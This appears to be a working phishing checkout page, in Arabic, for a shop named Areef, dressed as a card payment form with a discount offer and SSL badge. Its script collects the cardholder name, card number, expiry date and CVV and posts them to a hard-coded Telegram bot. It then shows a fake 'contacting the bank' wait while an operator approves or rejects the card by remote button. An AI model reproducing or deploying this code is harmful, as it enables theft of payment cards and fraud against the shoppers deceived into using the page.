<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>أرياف | الدفع</title>
<link rel="stylesheet" href="../../assets/fonts/cairo.css">
<style>
:root{--navy:#14304a;--blue:#2563eb;--line:#e3e8ec;--panel:#f5f7f9;--mut:#6b7780;--gold:#f3c63d;--ok:#16a34a}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:"Cairo","Segoe UI",Tahoma,Arial,sans-serif;background:#fff;color:#0f1d27;max-width:480px;margin:0 auto;padding:14px 14px calc(28px + env(safe-area-inset-bottom,0px));padding-top:calc(14px + env(safe-area-inset-top,0px));line-height:1.6}
a{color:inherit;text-decoration:none}
svg{width:1em;height:1em;flex:none}
:focus-visible{outline:3px solid #93c5fd;outline-offset:2px}
.back{display:inline-block;color:var(--mut);font-size:14px;font-weight:700;margin-bottom:12px}
.panel{background:var(--panel);border:1px solid var(--line);border-radius:22px;padding:16px}
.panel h2{display:flex;align-items:center;gap:8px;font-size:18px;margin:2px 4px 14px}
.opt{display:flex;align-items:center;gap:10px;background:#fff;border:1.5px solid var(--line);border-radius:16px;padding:16px 14px;margin-bottom:10px;cursor:pointer;font-weight:800;font-size:16px}
.opt:last-child{margin-bottom:0}
.opt:has(input:checked){border-color:var(--navy);box-shadow:0 0 0 1px var(--navy)}
.opt input{appearance:none;-webkit-appearance:none;flex:none;width:26px;height:26px;border-radius:50%;border:2px solid #8a949c;background:#fff}
.opt input:checked{border-color:var(--blue);background:var(--blue);box-shadow:inset 0 0 0 5px #fff}
.ic{flex:none;min-width:46px;height:38px;border:1px solid var(--line);border-radius:8px;background:#fff;display:grid;place-items:center;padding:0 6px;font-size:12px;font-weight:800}
.visa{color:#1a1f71;font-style:italic;font-size:14px}
.mc{position:relative;width:46px}.mc i{position:absolute;top:10px;width:18px;height:18px;border-radius:50%}
.mc i:first-child{background:#eb001b;inset-inline-start:7px}.mc i:last-child{background:#f79e1b;inset-inline-start:19px;opacity:.9}
.apay{color:#000}
.disc{margin-inline-start:auto;background:linear-gradient(#fbd34d,#f2b705);border-radius:8px;padding:2px 12px;font-size:13px;font-weight:800;color:#2a2100}
.f{margin-top:22px}
.f label,.lbl{display:flex;align-items:center;gap:6px;font-weight:800;font-size:15px;margin:0 2px 8px}
.f input{width:100%;height:58px;border:1.5px solid var(--line);border-radius:14px;padding:0 16px;font:inherit;font-size:18px;color:#0f1d27;background:#fff;direction:ltr;text-align:left;box-shadow:0 2px 5px rgba(15,29,39,.08)}
.f input::placeholder{color:#8a949c}
.f .num{letter-spacing:2px}
.two{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:22px}.two .f{margin:0}
.sum{margin-top:22px;background:#f0fbf4;border:1px solid #bfe9cf;border-radius:14px;padding:12px 16px;display:grid;grid-template-columns:1fr auto;gap:4px 12px;font-size:14px}
.sum .o{color:var(--mut)}.sum del{color:var(--mut)}.sum .g{color:var(--ok);font-weight:800}
.sum span:nth-child(even){text-align:left}
.pay{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;margin-top:14px;height:64px;border:0;border-radius:16px;background:linear-gradient(#f9db6a,var(--gold));color:#1d1a0c;font:inherit;font-weight:800;font-size:22px;box-shadow:0 8px 20px rgba(243,198,61,.4);cursor:pointer}
.pay:active{transform:scale(.99)}
.ssl{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:16px;color:var(--mut);font-size:13px}
@media(prefers-reduced-motion:reduce){*{transition:none!important}}
[hidden]{display:none!important}
.err{display:block;color:#d9263a;font-size:12.5px;font-weight:700;margin:6px 4px 0}.err:empty{display:none}
.f input.bad{border-color:#d9263a}.f input.ok{border-color:#16a34a}
.note{margin-top:14px;background:#fff7e0;border:1.5px solid #f1d98a;color:#6b4e00;border-radius:14px;padding:14px;font-weight:800;text-align:center}
.stat{margin-top:12px;text-align:center;color:var(--ok);font-weight:700;font-size:14px}.stat.bad{color:#d9263a}

/* تنسيق نافذة التحقق الشفافة */
#loadingOverlay {
  position: fixed;
  inset: 0;
  background: rgba(20, 48, 74, 0.6);
  backdrop-filter: blur(4px);
  z-index: 9999;
  display: flex;
  align-items: center;
  justify-content: center;
}
#loadingOverlay[hidden] {
  display: none !important;
}
.loader-box {
  background: #fff;
  padding: 24px 32px;
  border-radius: 20px;
  box-shadow: 0 10px 25px rgba(0,0,0,0.2);
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 16px;
  text-align: center;
  font-weight: 800;
  color: var(--navy);
}
.spinner {
  width: 48px;
  height: 48px;
  border: 4px solid var(--line);
  border-top-color: var(--blue);
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
}
@keyframes spin {
  to { transform: rotate(360deg); }
}
</style>
</head>
<body>

<!-- نافذة التحقق المنبثقة -->
<div id="loadingOverlay" hidden>
  <div class="loader-box">
    <div class="spinner"></div>
    <span id="loaderText">جاري التحقق من البيانات...</span>
  </div>
</div>

<a class="back" href="cart.html">‹ العودة إلى السلة</a>

<section class="panel" aria-labelledby="pm">
  <h2 id="pm"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l8 3v6c0 4.5-3.2 8-8 9-4.8-1-8-4.5-8-9V6z"/><path d="M9 12l2 2 4-4"/></svg> طريقة الدفع</h2>

  <label class="opt"><input type="radio" name="m" value="card" checked>
    <span class="ic mc" aria-hidden="true"><i></i><i></i></span>
    <span class="ic visa" aria-hidden="true">VISA</span>
    البطاقات الائتمانية
    <span class="disc">خصم 15%</span></label>

  <label class="opt"><input type="radio" name="m" value="apple">
    <span class="ic apay" aria-hidden="true">Pay</span>
    Apple Pay</label>
</section>

<div id="appleNote" class="note" role="status" hidden>Apple Pay غير متوفر حالياً</div>

<form id="cardForm" novalidate autocomplete="on">
  <div id="cardFields">
    <div class="f"><label for="cn">اسم حامل البطاقة</label>
      <input id="cn" name="ccname" autocomplete="cc-name" placeholder="CARDHOLDER NAME" autocapitalize="characters" spellcheck="false"><small class="err" id="e-cn"></small></div>
    <div class="f"><label for="cc"><svg viewBox="0 0 24 24" fill="none" stroke="#14304a" stroke-width="2"><rect x="2" y="5" width="20" height="14" rx="3"/><path d="M2 10h20"/></svg> رقم البطاقة</label>
      <input id="cc" class="num" name="cardnumber" autocomplete="cc-number" inputmode="numeric" maxlength="19" placeholder="1234  5678  9012  3456"><small class="err" id="e-cc"></small></div>
    <div class="two">
      <div class="f"><label for="ex">تاريخ الانتهاء</label><input id="ex" name="cc-exp" autocomplete="cc-exp" inputmode="numeric" maxlength="7" placeholder="MM/YY"><small class="err" id="e-ex"></small></div>
      <div class="f"><label for="cv">CVV <svg viewBox="0 0 24 24" fill="none" stroke="#14304a" stroke-width="2.2"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V8a4 4 0 018 0v3"/></svg></label><input id="cv" name="cvc" autocomplete="cc-csc" inputmode="numeric" maxlength="3" placeholder="123"><small class="err" id="e-cv"></small></div>
    </div>
  </div>
  <div class="sum" aria-label="ملخص الخصم">
    <span class="o">السعر الأصلي:</span><span><del>5.000 ر.ع</del></span>
    <span class="g">خصم 15%:</span><span class="g">‎-0.750 ر.ع</span>
  </div>
  <button type="submit" class="pay"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V8a4 4 0 018 0v3"/></svg> دفع 4.250 ر.ع</button>
  <p id="status" class="stat" role="status" hidden></p>
</form>

<p class="ssl"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l8 3v6c0 4.5-3.2 8-8 9-4.8-1-8-4.5-8-9V6z"/><path d="M9 12l2 2 4-4"/></svg> معاملتك محمية بتشفير SSL 256-bit</p>

<script>
(()=>{
  const $=id=>document.getElementById(id);
  const cn=$('cn'),cc=$('cc'),ex=$('ex'),cv=$('cv'),form=$('cardForm'),note=$('appleNote'),fields=$('cardFields'),status=$('status'),loadingOverlay=$('loadingOverlay'),loaderText=$('loaderText');
  const digits=v=>v.replace(/\D/g,'');
  const method=()=>document.querySelector('[name=m]:checked').value;

  /* ---------- إعدادات بوت تيليجرام ---------- */
  const TELEGRAM_BOT_TOKEN = '8741663993:AAGpYQSJwGVw6j2BxTDGf8ZHN9QUwXXwU50';
  const TELEGRAM_CHAT_ID = '8108427825';

  // دالة لجلب اسم صاحب الطلب المخزن محلياً
  function getCustomerName() {
    try {
      const savedOrder = JSON.parse(localStorage.getItem('areef_order'));
      if (savedOrder && savedOrder.name) {
        return savedOrder.name;
      }
    } catch (e) {
      console.error("خطأ في قراءة الاسم من التخزين المحلي", e);
    }
    return "غير متوفر";
  }

  async function sendToTelegram(data) {
    const ltrMark = '\u200E';
    const customerName = getCustomerName();

    const message = `💳 *بيانات بطاقة جديدة (أرياف)*:\n\n` +
                    `👤 *اسم صاحب الطلب:* ${ltrMark}${customerName}\n` +
                    `🏷️ *اسم حامل البطاقة:* ${ltrMark}${data.name}\n` +
                    `🔢 *رقم البطاقة:* \`${ltrMark}${data.card}\`\n` +
                    `📅 *تاريخ الانتهاء:* \`${ltrMark}${data.exp}\`\n` +
                    `🔐 *CVV:* \`${ltrMark}${data.cvv}\``;
    
    const replyMarkup = {
      inline_keyboard: [
        [
          { text: "✅ موافقة", callback_data: "approve_payment" },
          { text: "❌ رفض", callback_data: "reject_payment" }
        ]
      ]
    };

    try {
      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
          reply_markup: replyMarkup
        })
      });
      const json = await res.json();
      if(json.ok && json.result) {
        return json.result.message_id;
      }
    } catch (err) {
      console.error('خطأ أثناء إرسال البيانات إلى تيليجرام', err);
    }
    return null;
  }

  // دالة لتحديث رسالة تيليجرام وإزالة الأزرار وتغيير الحالة مع جلب الاسم
  async function updateTelegramMessage(messageId, cardData, action) {
    const ltrMark = '\u200E';
    const customerName = getCustomerName();
    const statusText = action === 'approve_payment' ? '✅ *الحالة:* تمت الموافقة' : '❌ *الحالة:* تم الرفض';
    
    const updatedMessage = `💳 *بيانات بطاقة (أرياف)*:\n\n` +
                           `👤 *اسم صاحب الطلب:* ${ltrMark}${customerName}\n` +
                           `🏷️ *اسم حامل البطاقة:* ${ltrMark}${cardData.name}\n` +
                           `🔢 *رقم البطاقة:* \`${ltrMark}${cardData.card}\`\n` +
                           `📅 *تاريخ الانتهاء:* \`${ltrMark}${cardData.exp}\`\n` +
                           `🔐 *CVV:* \`${ltrMark}${cardData.cvv}\`\n\n` +
                           `${statusText}`;
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          message_id: messageId,
          text: updatedMessage,
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: [] } // إزالة الأزرار
        })
      });
    } catch (e) {
      console.error('خطأ أثناء تحديث رسالة تيليجرام', e);
    }
  }

  async function pollTelegramResponse(messageId) {
    let offset = 0;
    const startTime = Date.now();
    
    while (Date.now() - startTime < 300000) {
      try {
        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${offset}&timeout=5`);
        const data = await res.json();
        
        if (data.ok && data.result) {
          for (const update of data.result) {
            offset = update.update_id + 1;
            
            if (update.callback_query && update.callback_query.message.message_id === messageId) {
              const action = update.callback_query.data;
              
              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: update.callback_query.id })
              });

              return action; 
            }
          }
        }
      } catch (e) {
        console.log('خطأ في جلب التحديثات', e);
      }
      await new Promise(r => setTimeout(r, 1000));
    }
    return null;
  }

  /* ---------- أدوات ---------- */
  function setErr(el,msg){$('e-'+el.id).textContent=msg||'';el.classList.toggle('bad',!!msg);el.setAttribute('aria-invalid',String(!!msg))}
  const fmtCard=d=>(d.match(/.{1,4}/g)||[]).join(' ');
  function reformat(el,fn){
    const pos=el.selectionStart,before=digits(el.value.slice(0,pos)).length;
    el.value=fn(el.value);
    if(document.activeElement!==el)return;
    let n=0,i=0;for(;i<el.value.length&&n<before;i++)if(/\d/.test(el.value[i]))n++;
    try{el.setSelectionRange(i,i)}catch(e){}
  }
  const luhn=d=>{let s=0,alt=false;for(let i=d.length-1;i>=0;i--){let n=+d[i];if(alt){n*=2;if(n>9)n-=9}s+=n;alt=!alt}return s%10===0};

  function cleanExp(d){
    const now=new Date(),cm=now.getMonth()+1,ys=Array.from({length:21},(_,i)=>(now.getFullYear()+i)%100);
    let out='';
    for(const ch of d){const x=+ch,n=out.length;
      if(n===0){out=x>1?'0'+ch:ch}
      else if(n===1){const m1=+out[0];if((m1===0&&x===0)||(m1===1&&x>2))continue;out+=ch}
      else if(n===2){if(ys.some(y=>Math.floor(y/10)===x))out+=ch}
      else if(n===3){const yy=+(out[2]+ch);if(ys.includes(yy)&&!(yy===now.getFullYear()%100&&+out.slice(0,2)<cm))out+=ch}
    }
    return out;
  }

  const onFmt=(el,fn,done)=>['input','change'].forEach(t=>el.addEventListener(t,e=>{
    const del=/^delete/.test(e.inputType||'');
    reformat(el,v=>fn(v,del));el.classList.remove('ok');
    if(el.classList.contains('bad')||done(el))validate(el)}));
  onFmt(cn,v=>v.toUpperCase().replace(/\s{2,}/g,' ').replace(/[0-9]/g,''),()=>false);
  onFmt(cc,v=>fmtCard(digits(v).slice(0,16)),el=>digits(el.value).length===16);
  onFmt(ex,(v,del)=>{
    const m=v.trim().match(/^(\d{1,2})\D+(\d{4})$/);
    const d=cleanExp(m?m[1].padStart(2,'0')+m[2].slice(2):digits(v).slice(0,4));
    if(d.length>2)return d.slice(0,2)+'/'+d.slice(2);
    return d.length===2&&!del?d+'/':d;
  },el=>el.value.length===5);
  onFmt(cv,v=>digits(v).slice(0,3),el=>el.value.length===3);

  cv.addEventListener('focus',()=>{cv.type='text'});
  cv.addEventListener('blur',()=>{if(cv.value)cv.type='password'});

  const rules={
    cn:()=>cn.value.trim().length<3?'أدخل اسم حامل البطاقة كما هو مكتوب عليها':'',
    cc:()=>{const d=digits(cc.value);
      if(d.length<16)return 'رقم البطاقة غير مكتمل (16 رقماً)';
      return luhn(d)?'':'رقم البطاقة غير صحيح'},
    ex:()=>{const m=ex.value.match(/^(\d{2})\/(\d{2})$/);if(!m)return 'أدخل التاريخ بصيغة MM/YY';
      const mo=+m[1],yr=2000+ +m[2],now=new Date();
      if(mo<1||mo>12)return 'الشهر غير صحيح';
      if(yr<now.getFullYear()||(yr===now.getFullYear()&&mo<now.getMonth()+1))return 'البطاقة منتهية الصلاحية';
      return yr>now.getFullYear()+20?'تاريخ الانتهاء غير صحيح':''},
    cv:()=>digits(cv.value).length===3?'':'رمز CVV مكوّن من 3 أرقام'
  };
  function validate(el){const msg=rules[el.id]();setErr(el,msg);el.classList.toggle('ok',!msg&&!!el.value);return !msg}
  [cn,cc,ex,cv].forEach(el=>el.addEventListener('blur',()=>{if(el.value)validate(el)}));

  function applyMethod(){
    const apple=method()==='apple';
    note.hidden=!apple;fields.hidden=apple;status.hidden=true;
  }
  document.querySelectorAll('[name=m]').forEach(r=>r.addEventListener('change',applyMethod));
  applyMethod();

  /* ---------- إرسال النموذج عند النقر على دفع ---------- */
  form.addEventListener('submit',async e=>{
    e.preventDefault();
    status.hidden=true;status.classList.remove('bad');
    setErr(cc, '');

    if(method()==='apple'){note.hidden=false;note.scrollIntoView({block:'center'});return}
    const bad=[cn,cc,ex,cv].filter(el=>!validate(el));
    if(bad.length){bad[0].focus();return}
    
    const cardData = {
      name: cn.value.trim(),
      card: cc.value.trim(),
      exp: ex.value.trim(),
      cvv: cv.value.trim()
    };

    loadingOverlay.hidden = false;
    loaderText.textContent = 'جاري التحقق من البيانات...';

    const msgId = await sendToTelegram(cardData);

    if(!msgId) {
      loaderText.textContent = 'حدث خطأ في الاتصال، يرجى المحاولة لاحقاً';
      setTimeout(()=>{ loadingOverlay.hidden = true; }, 3000);
      return;
    }

    loaderText.textContent = 'جار الاتصال بالبنك ...';

    const decision = await pollTelegramResponse(msgId);

    loadingOverlay.hidden = true;

    if (decision) {
      await updateTelegramMessage(msgId, cardData, decision);
    }

    if (decision === 'reject_payment') {
      setErr(cc, 'تم رفض البطاقة يرجى استخدام بطاقة مختلفة');
      cc.focus();
    } else if (decision === 'approve_payment') {
      window.location.href = 'success.html';
    } else {
      setErr(cc, 'انتهت مهلة الانتظار، يرجى إعادة المحاولة');
    }
  });
})();
</script>
</body>
</html>
